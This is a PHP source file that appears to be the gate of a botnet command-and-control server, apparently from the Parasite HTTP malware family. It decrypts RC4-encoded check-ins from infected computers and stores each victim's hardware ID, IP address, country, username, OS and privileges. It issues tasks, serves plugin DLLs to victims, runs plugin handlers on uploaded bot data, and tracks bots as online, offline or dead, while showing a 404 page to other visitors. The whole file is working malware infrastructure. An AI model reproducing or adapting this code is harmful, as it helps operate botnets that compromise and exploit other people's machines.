<?php 
$initialized = true;
$time = time();
$pub = "-----BEGIN PUBLIC KEY-----\r\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAqoHu9Hog7SpTlP2ooWiW\r\nOxhfMR6rHeB9ZhxjlOxJHuv9tsm8qmeSbmyv7qHchN7eW8cf580a7nWldY5NHy8e\r\nB7AyPbrDvBvtBXdrRr1mDWXvCSu5N/SibDNKS7Nfyf0J7mSfbpDGHhjIUmQ8lxX3\r\naTFDP7ONPckXxvfqKFea8svh38hDphxcA0UnU1jsSXPMxe3JZ0ShshLI/jhyfHef\r\nrkOwQelhcc2oRqKJ2f89Ksu/M3LXOuQJTT/tntKgNESQRqx+I95rRBOK5c2G/18C\r\n1RCkPI+GZ/ymXlOfTZ0Jw93jSk0IL4EwPjawWr3cmKTL6Z18u64tL/+JIDUA9vMX\r\n5DpL4nV/1vZXA+t0wQKnYlha/Hs0FrbzNIBABr3IINPLfilsR0jMaTDJSNxLuyvs\r\n4VabeGbqApnU8+4PvLr0IjlRHCaa81qwIQnMIbJvDmGdTLJSEceFjSp63NOCsIjw\r\ngKE9PnkXceFIIp235xOfS2wkuKwbbAda2ymkELScsXUAtHFKwO3rpyh2Wsx2q/q+\r\nwM5DCRw0QhWdxsvseozGib/v3yI2ROMhBtAlGFrmxDijKPSEgIhE+UCf+YWpYQ+W\r\nqqeRoraqse2K/ypZ+43VZsfNC9LFviWpNk+f3Vb9dPZYBswznD9ZEVc7KuvObpYL\r\ntq+vp4N+MKtIyGrntFCP/r8CAwEAAQ==\r\n-----END PUBLIC KEY-----";
define("ACTION", "aaa");
define("HWID", "bbb");
define("USER", "ccc");
define("OS", "ddd");
define("CPU", "eee");
define("USER_PRIVILEGES", "fff");
define("PLUGIN_GUID", "ggg");
define("PLUGIN_DATA", "hhh");
define("ACTION_SIGN", "0");
define("ACTION_GET_PLUGIN", "1");
define("ACTION_SEND_PLUGIN_DATA", "2");
define("TASKS", "iii");
define("SETTINGS", "jjj");
define("PLUGINS", "kkk");
define("KNOCK_INTERVAL", "ooo");
define("CACHE_PLUGINS", "ppp");
define("TASK", "rrr");
define("PARAMETER", "sss");
define("PENDING", "ttt");
define("MASK", "uuu");
require("include/defines.php");
require("include/internal.php");
include_once("include/RC4.php");
include_once("include/functions.php");
include_once("include/settings.php");
include_once("include/HTTP.php");
include_once("include/tasks.php");
if( $_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST) && empty($_SESSION["parasite"]) ) 
{
    $ValidActivationCode = false;
    $Post_data = filter_input_array(INPUT_POST);
    $decoded = NULL;
    foreach( $Post_data as $param_name => $param_val ) 
    {
        $decoded = json_decode(rc4(KEY_1, Base64UrlDecode($param_val)), true);
        if( isset($decoded[HWID]) ) 
        {
            if( strlen($decoded[HWID])) 
            {
                $GLOBALS["response_key"] = strtoupper(md5($decoded[HWID]));
                break;
            }

            $decoded = NULL;
        }

    }

	$ValidActivationCode = true;


    if( $decoded && isset($decoded[ACTION]) && isset($GLOBALS["response_key"]) ) 
    {
        if( !strlen($decoded[HWID]) || !strlen($decoded[USER]) || !strlen($decoded[CPU]) || !strlen($decoded[OS]) || !strlen($decoded[USER_PRIVILEGES]) ) 
        {
        }

        if( $decoded[ACTION] == ACTION_SIGN ) 
        {
            $ip = GetIPAddress();
            $countrycode = GetIPLocation($ip, $db);
            $hwid = $decoded[HWID];
            $username = base64_decode($decoded[USER]);
            $cpu = $decoded[CPU];
            $os = $decoded[OS];
            $user_privileges = $decoded[USER_PRIVILEGES];
            $query = "SELECT * FROM clients WHERE hwid = :hwid LIMIT 1";
            $query_params = array( ":hwid" => $hwid );
            try
            {
                $stmt = $db->prepare($query);
                $result = $stmt->execute($query_params);
            }
            catch( PDOException $ex ) 
            {
                DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
            }
            $row_client = $stmt->fetch();
            $plugins = array(  );
            $settings = NULL;
            $task = NULL;
            if( $row_client ) 
            {
                $query = "UPDATE clients SET \r\n\t\t\t\t\tip = :ip, \r\n\t\t\t\t\tcc = :cc, \r\n\t\t\t\t\tstatus = :status,\r\n\t\t\t\t\tlast_check = :last_check\r\n\t\t\t\t\tWHERE hwid = :hwid";
                $query_params = array( ":ip" => $ip, ":cc" => $countrycode, ":status" => STATUS_ONLINE, ":last_check" => $time, ":hwid" => $hwid );
                try
                {
                    $stmt = $db->prepare($query);
                    $result = $stmt->execute($query_params);
                }
                catch( PDOException $ex ) 
                {
                    DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                }
                if( $ValidActivationCode ) 
                {
                    $task = GetLatestTask($db, $hwid, $row_client["install_date"]);
                }
                else
                {
                    $task = array( TASK => 0, PARAMETER => base64_encode(""), PENDING => 0, MASK => "0" );
                }

            }
            else
            {
                if( !$g_disable_gates ) 
                {
                    $query = "INSERT INTO clients ( \r\n\t\t\t\t\t\t\t\thwid, \r\n\t\t\t\t\t\t\t\tip, \r\n\t\t\t\t\t\t\t\tcc,\r\n\t\t\t\t\t\t\t\tuser,\r\n\t\t\t\t\t\t\t\tos,\r\n\t\t\t\t\t\t\t\tcpu,\r\n\t\t\t\t\t\t\t\tinstall_date,\r\n\t\t\t\t\t\t\t\tuser_privileges,\r\n\t\t\t\t\t\t\t\tstatus,\r\n\t\t\t\t\t\t\t\tlast_check\r\n\t\t\t\t\t\t\t) VALUES ( \r\n\t\t\t\t\t\t\t\t:hwid, \r\n\t\t\t\t\t\t\t\t:ip, \r\n\t\t\t\t\t\t\t\t:cc,\r\n\t\t\t\t\t\t\t\t:user,\r\n\t\t\t\t\t\t\t\t:os,\r\n\t\t\t\t\t\t\t\t:cpu,\r\n\t\t\t\t\t\t\t\t:install_date,\r\n\t\t\t\t\t\t\t\t:user_privileges,\r\n\t\t\t\t\t\t\t\t:status,\r\n\t\t\t\t\t\t\t\t:last_check\r\n\t\t\t\t\t\t\t)";
                    $query_params = array( ":hwid" => $hwid, ":ip" => $ip, ":cc" => $countrycode, ":user" => $username, ":os" => $os, ":cpu" => $cpu, ":install_date" => $time, ":user_privileges" => $user_privileges, ":status" => STATUS_ONLINE, ":last_check" => $time );
                    try
                    {
                        $stmt = $db->prepare($query);
                        $stmt->execute($query_params);
                    }
                    catch( PDOException $ex ) 
                    {
                        DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                    }
                    if( $ValidActivationCode ) 
                    {
                        $task = GetLatestTask($db, $hwid, $time);
                    }
                    else
                    {
                        $task = array( TASK => 0, PARAMETER => base64_encode(""), PENDING => 0, MASK => "0" );
                    }

                }
                else
                {
                    include("pages/404.php");
                }

            }

            if( $task[TASK] == TASK_UNINSTALL || $task[TASK] == TASK_UPDATE ) 
            {
                $query = "DELETE FROM clients WHERE hwid = :hwid";
                $query_params = array( ":hwid" => $hwid );
                try
                {
                    $stmt = $db->prepare($query);
                    $stmt->execute($query_params);
                }
                catch( PDOException $ex ) 
                {
                    DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                }
            }
            else
            {
                $query_plugins = "SELECT * FROM plugins";
                try
                {
                    $stmt = $db->prepare($query_plugins);
                    $stmt->execute();
                }
                catch( PDOException $ex ) 
                {
                    DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                }
                $rows_plugin = $stmt->fetchAll();
                foreach( $rows_plugin as $row_plugin ) 
                {
                    if( $row_plugin["has_dll"] == true && $ValidActivationCode ) 
                    {
                        array_push($plugins, $row_plugin["guid"]);
                    }

                }
            }

            $settings = array( KNOCK_INTERVAL => intval($g_knock_interval), CACHE_PLUGINS => intval($g_cache_plugins) );
            $Response = array( TASKS => $task, SETTINGS => $settings, PLUGINS => $plugins );
            SendResponse(json_encode($Response));
        }
        else
        {
            if( $decoded[ACTION] == ACTION_GET_PLUGIN ) 
            {
                $query = "SELECT * FROM clients WHERE hwid = :hwid LIMIT 1";
                $query_params = array( ":hwid" => $decoded[HWID] );
                try
                {
                    $stmt = $db->prepare($query);
                    $result = $stmt->execute($query_params);
                }
                catch( PDOException $ex ) 
                {
                    DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                }
                $row_client = $stmt->fetch();
                if( $row_client ) 
                {
                    $file = "plugins/" . $decoded[PLUGIN_GUID] . "/PluginBase.dll";
                    if( file_exists($file) ) 
                    {
                        header("Content-Description: File Transfer");
                        header("Content-Type: application/octet-stream");
                        header("Content-Disposition: attachment; filename=\"plugin.dat\"");
                        header("Expires: 0");
                        header("Cache-Control: no-cache");
                        header("Content-Length: " . filesize($file));
                        readfile($file);
                        exit();
                    }

                    include("pages/404.php");
                }

            }
            else
            {
                if( $decoded[ACTION] == ACTION_SEND_PLUGIN_DATA ) 
                {
                    $query = "SELECT * FROM clients WHERE hwid = :hwid LIMIT 1";
                    $query_params = array( ":hwid" => $decoded[HWID] );
                    try
                    {
                        $stmt = $db->prepare($query);
                        $result = $stmt->execute($query_params);
                    }
                    catch( PDOException $ex ) 
                    {
                        DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                    }
                    $row_client = $stmt->fetch();
                    if( $row_client ) 
                    {
                        if( $ValidActivationCode ) 
                        {
                            $plugin = "plugins/" . $decoded[PLUGIN_GUID] . "/gate.php";
                        }

                        if( isset($plugin) && file_exists($plugin) ) 
                        {
                            if( isset($decoded[PLUGIN_DATA]) ) 
                            {
                                parse_str(base64_decode($decoded[PLUGIN_DATA]), $_POST);
                                if( !isset($_POST["hwid"]) ) 
                                {
                                    $_POST["hwid"] = $decoded[HWID];
                                }

                            }

                            include($plugin);
                        }
                        else
                        {
                            include("pages/404.php");
                        }

                    }

                }
                else
                {
                    include("pages/404.php");
                }

            }

        }

    }
    else
    {
        include("pages/404.php");
    }

}
else
{
    if( !empty($_SESSION["parasite"]) ) 
    {
        if( $g_last_updated < $time - 60 ) 
        {
            $query_online = "SELECT * FROM clients WHERE status = '" . STATUS_ONLINE . "' AND last_check < :last_check";
            $query_online_params = array( ":last_check" => $time - $g_offline_interval * 60 );
            try
            {
                $stmt = $db->prepare($query_online);
                $stmt->execute($query_online_params);
            }
            catch( PDOException $ex ) 
            {
                DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
            }
            $rows_offline = $stmt->fetchAll();
            foreach( $rows_offline as $row_offline ) 
            {
                $query_offline = "UPDATE clients SET status = '" . STATUS_OFFLINE . "' WHERE hwid = :hwid";
                $query_offline_params = array( ":hwid" => $row_offline["hwid"] );
                try
                {
                    $stmt = $db->prepare($query_offline);
                    $stmt->execute($query_offline_params);
                }
                catch( PDOException $ex ) 
                {
                    DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                }
            }
            $query_offline = "SELECT * FROM clients WHERE status = '" . STATUS_OFFLINE . "' AND last_check < :last_check";
            $query_offine_params = array( ":last_check" => $time - $g_dead_interval * 3600 * 24 );
            try
            {
                $stmt = $db->prepare($query_offline);
                $stmt->execute($query_offine_params);
            }
            catch( PDOException $ex ) 
            {
                DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
            }
            $rows_dead = $stmt->fetchAll();
            foreach( $rows_dead as $row_dead ) 
            {
                $query_dead = "UPDATE clients SET status = '" . STATUS_DEAD . "' WHERE hwid = :hwid";
                $query_dead_params = array( ":hwid" => $row_dead["hwid"] );
                try
                {
                    $stmt = $db->prepare($query_dead);
                    $stmt->execute($query_dead_params);
                }
                catch( PDOException $ex ) 
                {
                    DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
                }
            }
            $query_last_cleanup = "UPDATE settings SET settings_updated = :settings_updated WHERE id = 1";
            $query_last_cleanup_params = array( ":settings_updated" => $time );
            try
            {
                $stmt = $db->prepare($query_last_cleanup);
                $stmt->execute($query_last_cleanup_params);
            }
            catch( PDOException $ex ) 
            {
                DEBUG_PRINT("Failed to run query: " . $ex->getMessage());
            }
        }

        include("pages/base.php");
    }
    else
    {
        include("pages/404.php");
    }

}
?>